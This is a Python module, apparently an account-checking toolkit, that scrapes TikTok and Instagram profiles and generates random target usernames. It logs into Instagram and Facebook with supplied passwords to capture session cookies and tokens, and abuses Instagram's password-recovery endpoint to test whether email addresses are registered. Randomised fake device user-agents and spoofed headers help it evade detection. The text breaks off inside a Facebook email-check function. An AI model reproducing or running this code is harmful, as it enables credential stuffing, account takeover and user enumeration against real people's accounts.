#@FC_CT
import requests , random
import threading
import sys
from concurrent.futures import ThreadPoolExecutor
from faker import Faker
import random

class TikTok:
	@staticmethod
	def info(user):
		import requests , datetime
		patre = {
        "Host": "www.tiktok.com",
        "sec-ch-ua": "\" Not A;Brand\";v\u003d\"99\", \"Chromium\";v\u003d\"99\", \"Google Chrome\";v\u003d\"99\"",
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": "\"Android\"",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.0.0; Plume L2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
        "accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9",
        "sec-fetch-site": "none",
        "sec-fetch-mode": "navigate",
        "sec-fetch-user": "?1",
        "sec-fetch-dest": "document",
        "accept-language": "en-US,en;q\u003d0.9,ar-DZ;q\u003d0.8,ar;q\u003d0.7,fr;q\u003d0.6,hu;q\u003d0.5,zh-CN;q\u003d0.4,zh;q\u003d0.3"
    }
		tikinfo = requests.get(f'https://www.tiktok.com/@{user}', headers=patre).text
		try:
			getting = str(tikinfo.split('webapp.user-detail"')[1]).split('"RecommendUserList"')[0]
			id = str(getting.split('id":"')[1]).split('",')[0]
			name = str(getting.split('nickname":"')[1]).split('",')[0]
			bio = str(getting.split('signature":"')[1]).split('",')[0]
			country = str(getting.split('region":"')[1]).split('",')[0]
			private = str(getting.split('privateAccount":')[1]).split(',"')[0]
			followers = str(getting.split('followerCount":')[1]).split(',"')[0]
			following = str(getting.split('followingCount":')[1]).split(',"')[0]
			like = str(getting.split('heart":')[1]).split(',"')[0]
			video = str(getting.split('videoCount":')[1]).split(',"')[0]
			B = bin(int(id))[2:]
			L, BS = 0, ""
			while L < 31:
				BS += B[L]
				L += 1
			Date = datetime.datetime.fromtimestamp(int(BS, 2)).strftime('%Y / %m / %d')
			return {
				'Programmer': 'tig3r_coder',
				'id': id,
				'name': name,
				'username': user,
				'followers': followers,
				'following': following,
				'likes': like,
				'videos': video,
				'date': Date,
				'private': private		
				}
		except Exception as e:
			return {
				'Programmer': 'tig3r_coder',
				'info': 'Error',
				'username': user,
				}
	@staticmethod
	def GetUsers():
		import requests , random , string , hashlib
		g=random.choice(['azertyuiopmlkjhgfdsqwxcvbn','azertyuiopmlkjhgfdsqwxcvbn','azertyuiopmlkjhgfdsqwxcvbn','azertyuiopmlkjhgfdsqwxcvbn',  'azertyuiopmlkjhgfdsqwxcvbn', 'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',  'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',  'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',  'abcdefghijklmnopqrstuvwxyzñ',   'abcdefghijklmnopqrstuvwxyzñ',  'abcdefghijklmnopqrstuvwxyzñ','абвгдеёжзийклмнопрстуфхцчшщъыьэюя',  'абвгдеёжзийклмнопрстуфхцчшщъыьэюя','абвгдеёжзийклмнопрстуфхцчшщъыьэюя','的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之','的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之','的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之','アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',  'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン','あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん', 'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん','אבגדהוזחטיכלמנסעפצקרשת','אבגדהוזחטיכלמנסעפצקרשת','دجحخهعغفقثصضشسيبلاتنمكطظزوةيارؤءئ','دجحخهعغفقثصضشسيبلاتنمكطظزوةيارؤءئ','αβγδεζηθικλμνξοπρστυφχψω','αβγδεζηθικλμνξοπρστυφχψω','abcdefghijklmnopqrstuvwxyzç','abcdefghijklmnopqrstuvwxyzç','กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ','กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ','अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ','अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ',])
		usery = random.choice(["".join(random.choice("1234567890qwertyuiopasdfghjklzxcvbnm.") for _ in range(int("".join(random.choice("6789") for _ in range(1))))), ''.join((random.choice(random.choice(g)) for _ in range(random.randrange(3, 15))))])
		try:
			response = requests.get(f"https://tiktok.livecounts.io/user/search/{usery}", headers={'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36",'sec-ch-ua-platform': "\"Android\"",'x-midas': hashlib.sha256(''.join(random.choices(string.ascii_letters + string.digits, k=64)).encode()).hexdigest(),'x-ajay': hashlib.sha1(''.join(random.choices(string.ascii_letters + string.digits, k=40)).encode()).hexdigest(),'sec-ch-ua': "\"Google Chrome\";v=\"129\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"129\"",'sec-ch-ua-mobile': "?1",'x-catto': str(random.randint(1000000000000, 9999999999999)),'origin': "https://livecounts.io",'sec-fetch-site': "same-site",'sec-fetch-mode': "cors",'sec-fetch-dest': "empty",'referer': "https://livecounts.io/",'accept-language': "en-GB,en-US;q=0.9,en;q=0.8,ar;q=0.7",'priority': "u=1, i"})
			user_data = response.json()['userData']
			user_ids = [user['id'] for user in user_data]
			for user in user_ids:
				return user
		except Exception as e:
			TikTok.GetUsers()

#API Instagram
class Instagram:
	@staticmethod
	def info(userr):
		import requests
		try:
			url = f"https://i.instagram.com/api/v1/users/web_profile_info/?username={userr}"
			headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                        "X-IG-App-ID": "936619743392459",
                        "Accept": "*/*",
                        "Accept-Language": "en-US,en;q=0.9",
                        "Accept-Encoding": "gzip, deflate, br",
                        "Connection": "keep-alive"
                    }
			response = requests.get(url, headers=headers)
			if response.status_code != 200:
				pass
			data = response.json()
			user = data['data']['user']
			Id=user['id']
			name=user["full_name"]
			fol=user["edge_followed_by"]["count"]
			folg=user["edge_follow"]["count"]
			post=user["edge_owner_to_timeline_media"]["count"]
			bio=user["biography"]
			private=user["is_private"]
			url=user["profile_pic_url"]
			try:		        
			        if int(Id) >1 and int(Id)<1279000:
			            date =  "2010"
			        elif int(Id)>1279001 and int(Id)<17750000:
			            date =  "2011"
			        elif int(Id) > 17750001 and int(Id)<279760000:
			            date =  "2012"
			        elif int(Id)>279760001 and int(Id)<900990000:
			            date =  "2013"
			        elif int(Id)>900990001 and int(Id)< 1629010000:
			            date =  "2014"
			        elif int(Id)>1900000000 and int(Id)<2500000000:
			            date =  "2015"
			        elif int(Id)>2500000000 and int(Id)<3713668786:
			            date =  "2016"
			        elif int(Id)>3713668786 and int(Id)<5699785217:
			            date =  "2017"
			        elif int(Id)>5699785217 and int(Id)<8507940634:
			            date =  "2018"
			        elif int(Id)>8507940634 and int(Id)<21254029834:
			            date =  "2019"	         
			        else:
			            date = "2020-2023"
			except:
				date = None
			return {
			'Programmer': 'tig3r_coder',
			'name': name,
			'username': userr,
			'followers': fol,
			'following': folg,
			'post': post,
			'id': Id,
			'date': date,
			'bio': bio,
			'url': url						
				}		 
		except requests.exceptions.RequestException as e:
			return {
			'Programmer': 'tig3r_coder',
			'username': userr,
			'info': 'Error'			
				}
	@staticmethod
	def GetUsers():
		import random , requests , user_agent
		g=random.choice(['абвгдеёжзийклмнопрстуфхцчшщъыьэюя',  'абвгдеёжзийклмнопрстуфхцчшщъыьэюя','абвгдеёжзийклмнопрстуфхцчшщъыьэюя','的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之','的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之','的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之','アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',  'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン','あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん', 'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん','אבגדהוזחטיכלמנסעפצקרשת','אבגדהוזחטיכלמנסעפצקרשת','αβγδεζηθικλμνξοπρστυφχψω','αβγδεζηθικλμνξοπρστυφχψω','กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ','กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ','अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ','अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ','ضصثقفغعهخحجطكمنتالبيسشءذؤرىةوزظد','ذءؤرىةوزظدطكمنتالبيسشضصثقفغعهخحح','جطدظزوةىرؤءذشضصسيبقبفلناهغحاظا','qwertyuioplkjhgfdsazxcvbnm','plmnjkoiuytrewqasdfghjbvcxz','zxcvbnmasdfghjklqwertyuiop','1234567890asdfghjklmnbvcxzqwertyuiop','mnbvcxzasdfghjklpoiuytrewq1478096523'])
		usery = ''.join((random.choice(random.choice(g)) for _ in range(random.randrange(3, 10))))
		headers = {
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://www.instagram.com',
                    'referer': 'https://www.instagram.com/',
                    'user-agent': user_agent.generate_user_agent(),
                    'x-fb-friendly-name': 'PolarisSearchBoxRefetchableDirectQuery',
                }
		data = {
                    'fb_api_caller_class': 'RelayModern',
                    'fb_api_req_friendly_name': 'PolarisSearchBoxRefetchableDirectQuery',
                    'variables': '{"data":{"context":"blended","include_reel":"true","query":"'+str(usery)+'","rank_token":"","search_surface":"web_top_search"},"hasQuery":true}',
                    'server_timestamps': 'true',
                    'doc_id': '7778489908879212',
                }
		try:
			response = requests.post('https://www.instagram.com/graphql/query', cookies=None, headers=headers, data=data).json()['data']['xdt_api__v1__fbsearch__topsearch_connection']['users']
			for user in response:
				username = user['user']['username']
				return username    
		except:
			Instagram.GetUsers()
			
	@staticmethod
	def login(user,pas):
		list = []
		import requests , time , user_agent
		try:
			cookies = {
	    'csrftoken': 'EbkkCAEfwX3SjarTwdnvov'}
			headers = {
	    'authority': 'www.instagram.com',
	    'accept': '*/*',
	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://www.instagram.com',
	    'referer': 'https://www.instagram.com/',
	    'sec-ch-prefers-color-scheme': 'dark',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-model': '"RMX3511"',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-ch-ua-platform-version': '"13.0.0"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': user_agent.generate_user_agent(),
	    'x-asbd-id': '129477',
	    'x-csrftoken': 'EbkkCAEfwX3SjarTwdnvov',
	    'x-ig-app-id': '1217981644879628',
	    'x-ig-www-claim': '0',
	    'x-instagram-ajax': '1019787604',
	    'x-requested-with': 'XMLHttpRequest',
	    'x-web-session-id': 'qo8pb8:4yy0kr:mqz070',
	}
			tim = str(time.time()).split('.')[1]
			data = {
	    'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{tim}:{pas}',
	    'caaF2DebugGroup': '0',
	    'loginAttemptSubmissionCount': '0',
	    'optIntoOneTap': 'false',
	    'queryParams': '{}',
	    'trustedDeviceRecords': '{}',
	    'username': f'{user}',
	}
			response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', cookies=cookies, headers=headers, data=data)
			rr = response.text
			cok = response.cookies.get_dict()
			list.append(rr)
			if 'userId' in rr:
				list.append(cok)
			return list			      			
		except Exception as e:
			return e
	@staticmethod
	def CheckEmail(email):
		import requests , user_agent
		import random
		import requests
		import threading
		import sys
		from concurrent.futures import ThreadPoolExecutor
		from faker import Faker
		import random
		fake = Faker()
		tiger_77 = [
			"OnePlus", "Samsung", "Google Pixel", "iPhone", "Huawei", "Xiaomi", "LG", "Nokia", "Sony", "Motorola",
			"Asus", "Realme", "Oppo", "Vivo", "HTC", "Lenovo", "Meizu", "ZTE", "Honor", "Microsoft", "Google Nexus",
			"Sharp", "Acer", "Blackberry", "Essential", "Alcatel", "TCL", "Ptigeronic", "Micromax", "Karbonn", "Lava",
			"Infinix", "Tecno", "Coolpad", "Gionee", "Cherry Mobile", "ZTE", "LeEco", "iQOO", "Doogee", "Blu",
			"Realme", "POCO", "Lenovo Legion", "Xiaomi Mi", "Infinix Zero", "OnePlus Nord", "Vivo iQOO", "Meizu Pro",
			"Redmi Note", "Samsung Galaxy Z", "Oppo F9", "Vivo V15", "Moto E", "Vivo X50", "Samsung Galaxy M",
			"iPhone 11", "iPhone SE", "iPhone 7", "iPhone XR", "iPhone 8", "iPhone 12", "Oppo Reno", "Samsung J7",
			"Google Nexus 6", "Samsung S10", "Huawei P20", "Huawei P30", "Sony Xperia XZ", "Google Pixel 4",
			"Motorola Moto Z", "Samsung Galaxy Fold", "Honor 20", "Samsung Note 9", "Google Pixel 5", "Asus Zenfone",
			"Honor 9X", "Oppo Find X", "Xiaomi Poco F1", "Sony Xperia 1", "Motorola Moto G", "OnePlus 7T", "Redmi K30",
			"Nokia 7.1", "Vivo Y91", "Nokia 8", "Oppo A9", "Samsung Galaxy A52", "Realme 6", "Lenovo Z6 Pro",
			"Blackberry Priv", "Xiaomi Mi 10", "Motorola Edge", "Huawei Mate 30", "Nokia 6", "Xiaomi Mi A3", "Oppo F11",
			"Oppo R17", "Redmi 9", "Samsung Galaxy M31", "Vivo V17", "Vivo V19", "Realme 7", "Infinix S5 Pro",
			"Vivo X21", "Motorola Moto G8", "Oppo Reno 2", "Xiaomi Redmi 8", "Lenovo Legion", "ZTE Blade", "Oppo A5",
			"Realme 5 Pro", "Honor View 20", "Nokia 5.1", "Xiaomi Mi 9 SE", "Oppo A3S", "Google Pixel 2", "LG V30+",
			"Xiaomi Redmi Note 8", "Huawei Nova 5T", "Oppo A7", "Asus Zenfone Max", "Vivo V3", "Realme X2", "Meizu MX6",
			"Xiaomi Mi Mix", "Realme XT", "Oppo K1", "Google Pixel XL", "Honor 10", "Sony Xperia Z3", "LG G5",
			"Samsung Galaxy S9", "Motorola Moto X4", "Nokia 6.2", "OnePlus 6", "Vivo Y93", "Huawei P9", "Oppo A9 2020",
			"iPhone 6S", "Xiaomi Mi 11", "Huawei Mate 20", "Oppo F1", "Sony Xperia XZ1", "Samsung S8", "Vivo X21",
			"Xiaomi Mi Max", "OnePlus 5T", "Motorola Moto Z2", "Vivo Y11", "Honor 8X", "Nokia 3.2", "Oppo F5", "iPhone 6",
			"Asus Zenfone 4", "Huawei P10", "Samsung Galaxy S7", "Motorola Moto E4", "Vivo X60", "Oppo A31", "Meizu Pro 7",
			"Nokia 2.3", "Sony Xperia Z5", "Redmi Note 7", "Xiaomi Mi Mix 3", "Google Nexus 5X", "Samsung Galaxy A51",
			"Oppo R9", "Huawei Mate 10", "OnePlus 8", "Infinix Zero 7", "Realme 3 Pro", "Xiaomi Mi 5X", "Sony Xperia XA1",
			"Lenovo P2", "Huawei Mate 9", "Oppo A1K", "Vivo Y15", "Xiaomi Mi Pad", "Honor 8", "LG G6", "Sony Xperia Z2"
		]

		tiger_os = [
			"28/9", "30/11", "22/10", "25/7", "23/9", "31/12", "20/8", "21/6", "24/10", "29/9", "17/5", "26/1",
			"18/12", "32/3", "33/5", "19/11", "35/4", "36/8", "27/10", "34/2", "30/8", "21/9", "20/11", "29/8",
			"22/5", "26/3", "23/4", "21/7", "20/10", "25/9", "19/6", "23/12", "28/10", "22/4", "24/8", "20/1",
			"31/5", "25/6", "27/3", "30/6", "19/10", "22/9", "23/7", "24/6", "21/5", "22/8", "28/7", "24/5",
			"20/4", "29/5", "30/3", "21/4", "27/6", "25/5", "19/7", "28/12", "24/7", "22/11", "31/8", "26/7",
			"23/3", "27/9", "31/10", "20/2", "28/6", "29/3", "30/9", "21/3", "25/8", "20/5", "23/1", "26/2"
		]

		resolutions = [
			"1080x2147", "1440x2960", "750x1334", "1920x1080", "1280x720", "1080x1920", "2560x1440", "1440x2560",
			"720x1280", "3840x2160", "1366x768", "2160x1440", "1024x768", "1360x768", "800x480", "1280x800", "1600x900",
			"1440x900", "1680x1050", "2560x1600", "1920x1200", "1280x1024", "1600x1200", "1280x768", "1600x1280",
			"1440x1280", "1920x1600", "1600x1600", "1440x1600", "1280x1024", "1280x768", "1280x720", "1024x800",
			"1360x1024", "960x640", "1600x2560", "1920x1080", "960x854", "1280x768", "1920x800", "1600x1024",
			"2560x1600", "1280x600", "1680x1050", "1536x864", "1280x1024", "1920x1440", "1440x2560", "2160x1080",
			"1440x720", "1280x960", "1366x1024", "1680x900", "1280x1152", "1600x900", "1280x854", "1920x1200",
			"1440x960", "1024x576", "2048x1152", "1440x1024", "2048x1536", "1920x1280", "1600x1200", "1920x2560"
		]

		devices = [
			"OnePlus6T", "SM-G950F", "Pixel 3", "iPhone X", "Huawei P30", "Moto G7", "Galaxy S20", "iPhone 12", "iPhone 11",
			"Galaxy Note 10", "Xiaomi Mi 9", "iPhone 7", "Google Pixel 5", "Samsung A71", "iPhone 12 Pro", "Sony Xperia 1",
			"Huawei P40", "Nokia 6.1", "OnePlus 7 Pro", "Samsung Galaxy J7", "Huawei Mate 20 Pro", "Xiaomi Redmi Note 9",
			"iPhone SE", "Oppo Reno 10x", "Vivo V15", "Samsung Galaxy Z", "Sony Xperia XZ", "Google Pixel 4",
			"Motorola Moto Z", "Samsung Galaxy Fold", "Honor 20", "Samsung Note 9", "Google Pixel 5", "Asus Zenfone",
			"Honor 9X", "Oppo Find X", "Xiaomi Poco F1", "Sony Xperia 1", "Motorola Moto G", "OnePlus 7T", "Redmi K30",
			"Nokia 7.1", "Vivo Y91", "Nokia 8", "Oppo A9", "Samsung Galaxy A52", "Realme 6", "Lenovo Z6 Pro",
			"Blackberry Priv", "Xiaomi Mi 10", "Motorola Edge", "Huawei Mate 30", "Nokia 6", "Xiaomi Mi A3", "Oppo F11",
			"Oppo R17", "Redmi 9", "Samsung Galaxy M31", "Vivo V17", "Vivo V19", "Realme 7", "Infinix S5 Pro",
			"Vivo X21", "Motorola Moto G8", "Oppo Reno 2", "Xiaomi Redmi 8", "Lenovo Legion", "ZTE Blade", "Oppo A5",
			"Realme 5 Pro", "Honor View 20", "Nokia 5.1", "Xiaomi Mi 9 SE", "Oppo A3S", "Google Pixel 2", "LG V30+",
			"Xiaomi Redmi Note 8", "Huawei Nova 5T", "Oppo A7", "Asus Zenfone Max", "Vivo V3", "Realme X2", "Meizu MX6",
			"Xiaomi Mi Mix", "Realme XT", "Oppo K1", "Google Pixel XL", "Honor 10", "Sony Xperia Z3", "LG G5",
			"Samsung Galaxy S9", "Motorola Moto X4", "Nokia 6.2", "OnePlus 6", "Vivo Y93", "Huawei P9", "Oppo A9 2020",
			"iPhone 6S", "Xiaomi Mi 11", "Huawei Mate 20", "Oppo F1", "Sony Xperia XZ1", "Samsung S8", "Vivo X21",
			"Xiaomi Mi Max", "OnePlus 5T", "Motorola Moto Z2", "Vivo Y11", "Honor 8X", "Nokia 3.2", "Oppo F5", "iPhone 6",
			"Asus Zenfone 4", "Huawei P10", "Samsung Galaxy S7", "Motorola Moto E4", "Vivo X60", "Oppo A31", "Meizu Pro 7",
			"Nokia 2.3", "Sony Xperia Z5", "Redmi Note 7", "Xiaomi Mi Mix 3", "Google Nexus 5X", "Samsung Galaxy A51",
			"Oppo R9", "Huawei Mate 10", "OnePlus 8", "Infinix Zero 7", "Realme 3 Pro", "Xiaomi Mi 5X", "Sony Xperia XA1",
			"Lenovo P2", "Huawei Mate 9", "Oppo A1K", "Vivo Y15", "Xiaomi Mi Pad", "Honor 8", "LG G6", "Sony Xperia Z2",
			"OnePlus 6", "Samsung Galaxy S6", "iPhone XS", "Xiaomi Mi A2", "Motorola Moto G5", "Sony Xperia XZ Premium",
			"Oppo F3", "Vivo V5 Plus", "Nokia 5", "Realme 2 Pro", "Huawei Honor 8", "Lenovo K8 Plus", "Samsung Galaxy Note 8",
			"Xiaomi Redmi 6", "Vivo Y81", "Infinix Hot 7", "Meizu M6", "Oppo F9 Pro", "Sony Xperia XA", "Nokia 9 PureView",
			"Google Pixel 3 XL", "Samsung Galaxy A7", "Huawei P8", "Xiaomi Redmi 6A", "Oppo F1s", "Nokia 3", "Vivo Y12",
			"Infinix Zero 6", "Asus Zenfone 2", "Lenovo Vibe K5 Plus", "Motorola Moto G3", "Vivo Y55", "Realme 2",
			"Huawei P8 Lite", "Google Nexus 5", "Xiaomi Mi A1", "Sony Xperia M5", "Oppo A37", "Samsung Galaxy J5", "Vivo V11", "OnePlus", "Samsung", "Google Pixel", "iPhone", "Huawei", "Xiaomi", "LG", "Nokia", "Sony", "Motorola",
			"Asus", "Realme", "Oppo", "Vivo", "HTC", "Lenovo", "Meizu", "ZTE", "Honor", "Microsoft", "Google Nexus",
			"Sharp", "Acer", "Blackberry", "Essential", "Alcatel", "TCL", "Ptigeronic", "Micromax", "Karbonn", "Lava",
			"Infinix", "Tecno", "Coolpad", "Gionee", "Cherry Mobile", "ZTE", "LeEco", "iQOO", "Doogee", "Blu",
			"Realme", "POCO", "Lenovo Legion", "Xiaomi Mi", "Infinix Zero", "OnePlus Nord", "Vivo iQOO", "Meizu Pro",
			"Redmi Note", "Samsung Galaxy Z", "Oppo F9", "Vivo V15", "Moto E", "Vivo X50", "Samsung Galaxy M",
			"iPhone 11", "iPhone SE", "iPhone 7", "iPhone XR", "iPhone 8", "iPhone 12", "Oppo Reno", "Samsung J7",
			"Google Nexus 6", "Samsung S10", "Huawei P20", "Huawei P30", "Sony Xperia XZ", "Google Pixel 4",
			"Motorola Moto Z", "Samsung Galaxy Fold", "Honor 20", "Samsung Note 9", "Google Pixel 5", "Asus Zenfone",
			"Honor 9X", "Oppo Find X", "Xiaomi Poco F1", "Sony Xperia 1", "Motorola Moto G", "OnePlus 7T", "Redmi K30",
			"Nokia 7.1", "Vivo Y91", "Nokia 8", "Oppo A9", "Samsung Galaxy A52", "Realme 6", "Lenovo Z6 Pro",
			"Blackberry Priv", "Xiaomi Mi 10", "Motorola Edge", "Huawei Mate 30", "Nokia 6", "Xiaomi Mi A3", "Oppo F11",
			"Oppo R17", "Redmi 9", "Samsung Galaxy M31", "Vivo V17", "Vivo V19", "Realme 7", "Infinix S5 Pro",
			"Vivo X21", "Motorola Moto G8", "Oppo Reno 2", "Xiaomi Redmi 8", "Lenovo Legion", "ZTE Blade", "Oppo A5",
			"Realme 5 Pro", "Honor View 20", "Nokia 5.1", "Xiaomi Mi 9 SE", "Oppo A3S", "Google Pixel 2", "LG V30+",
			"Xiaomi Redmi Note 8", "Huawei Nova 5T", "Oppo A7", "Asus Zenfone Max", "Vivo V3", "Realme X2", "Meizu MX6",
			"Xiaomi Mi Mix", "Realme XT", "Oppo K1", "Google Pixel XL", "Honor 10", "Sony Xperia Z3", "LG G5",
			"Samsung Galaxy S9", "Motorola Moto X4", "Nokia 6.2", "OnePlus 6", "Vivo Y93", "Huawei P9", "Oppo A9 2020",
			"iPhone 6S", "Xiaomi Mi 11", "Huawei Mate 20", "Oppo F1", "Sony Xperia XZ1", "Samsung S8", "Vivo X21",
			"Xiaomi Mi Max", "OnePlus 5T", "Motorola Moto Z2", "Vivo Y11", "Honor 8X", "Nokia 3.2", "Oppo F5", "iPhone 6",
			"Asus Zenfone 4", "Huawei P10", "Samsung Galaxy S7", "Motorola Moto E4", "Vivo X60", "Oppo A31", "Meizu Pro 7",
			"Nokia 2.3", "Sony Xperia Z5", "Redmi Note 7", "Xiaomi Mi Mix 3", "Google Nexus 5X", "Samsung Galaxy A51",
			"Oppo R9", "Huawei Mate 10", "OnePlus 8", "Infinix Zero 7", "Realme 3 Pro", "Xiaomi Mi 5X", "Sony Xperia XA1",
			"Lenovo P2", "Huawei Mate 9", "Oppo A1K", "Vivo Y15", "Xiaomi Mi Pad", "Honor 8", "LG G6", "Sony Xperia Z2"
		]
		def tiger_usrg():
			device = random.choice(devices)
			os_version = random.choice(tiger_os)
			resolution = random.choice(resolutions)
			user_agent = f"Instagram 85.0.0.21.100 Android ({os_version}; 380dpi; {resolution}; {device}; HWEVA; {device}; qcom; en_US; 146536611)"
			return user_agent
		
		url = "https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/"
		
		headers = {
			"Host": "i.instagram.com",
			"user-agent": tiger_usrg(),
			"content-type": "application/x-www-form-urlencoded",
			"accept-encoding": "gzip"
		}

		payload = {
			"email": email
		}
		try:
			response = requests.post(url, headers=headers, data=payload)
			if "sent an" in response.text.lower():
				return {'Programmer': 'tig3r_coder','Email' :{email},'Check': 'Good'}
			elif '"spam"' in response.text.lower():
				return {'Programmer': 'tig3r_coder','IP': 'Block'}		     
			else:
				return {'Programmer': 'tig3r_coder','Check': 'Bad'}	    
		except Exception as e:
			return e


class Facebook:
	@staticmethod
	def Cookies(email,password):
		import requests , random , uuid , time , hashlib
		try:
			r = requests.Session()
			head = {'Host':'b-graph.facebook.com','X-Fb-Connection-Quality':'EXCELLENT','Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','User-Agent':'Dalvik/2.1.0 (Linux; U; Android 7.1.2; RMX3740 Build/QP1A.190711.020) [FBAN/FB4A;FBAV/417.0.0.33.65;FBPN/com.facebook.katana;FBLC/in_ID;FBBV/480086274;FBCR/Corporation Tbk;FBMF/realme;FBBD/realme;FBDV/RMX3740;FBSV/7.1.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.0,width=540,height=960};FB_FW/1;FBRV/483172840;]','X-Tigon-Is-Retry':'false','X-Fb-Friendly-Name':'authenticate','X-Fb-Connection-Bandwidth':str(random.randrange(70000000,80000000)),'Zero-Rated':'0','X-Fb-Net-Hni':str(random.randrange(50000,60000)),'X-Fb-Sim-Hni':str(random.randrange(50000,60000)),'X-Fb-Request-Analytics-Tags':'{"network_tags":{"product":"350685531728","retry_attempt":"0"},"application_tags":"unknown"}','Content-Type':'application/x-www-form-urlencoded','X-Fb-Connection-Type':'WIFI','X-Fb-Device-Group':str(random.randrange(4700,5000)),'Priority':'u=3,i','Accept-Encoding':'gzip, deflate','X-Fb-Http-Engine':'Liger','X-Fb-Client-Ip':'true','X-Fb-Server-Cluster':'true','Content-Length':str(random.randrange(1500,2000))}
			data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':email,'password':'#PWD_FB4A:0:{}:{}'.format(str(time.time())[:10], password),'generate_analytics_claim':'1','community_id':'','linked_guest_account_userid':'','cpl':True,'try_num':'1','family_device_id':str(uuid.uuid4()),'secure_family_device_id':str(uuid.uuid4()),'credentials_type':'password','account_switcher_uids':[],'fb4a_shared_phone_cpl_experiment':'fb4a_shared_phone_nonce_cpl_at_risk_v3','fb4a_shared_phone_cpl_group':'enable_v3_at_risk','enroll_misauth':False,'generate_session_cookies':'1','error_detail_type':'button_with_disabled','source':'login','machine_id':str(''.join([random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for i in range(24)])),'jazoest':str(random.randrange(22000,23000)),'meta_inf_fbmeta':'V2_UNTAGGED','advertiser_id':str(uuid.uuid4()),'encrypted_msisdn':'','currently_logged_in_userid':'0','locale':'id_ID','client_country_code':'ID','fb_api_req_friendly_name':'authenticate','fb_api_caller_class':'Fb4aAuthHandler','api_key':'882a8490361da98702bf97a021ddc14d','sig':str(hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:32]),'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
			pos  = r.post('https://b-graph.facebook.com/auth/login', data=data, headers=head).json()
			if ('session_key' in str(pos)) and ('access_token' in str(pos)):
			         token  = pos['access_token']
			         cookie = ''.join(['{}={};'.format(i['name'],i['value']) for i in pos['session_cookies']])
			         return {'Programmer': 'tig3r_coder', 'Cookies': cookie}
			else:
				return {'Programmer': 'tig3r_coder','Login': 'Bad'}
		except Exception as e:
			return e
			
	@staticmethod
	def CheckEmail(email):
		import requests , uuid , random
		try:
			headers = {
    'Host': 'b-graph.facebook.com',
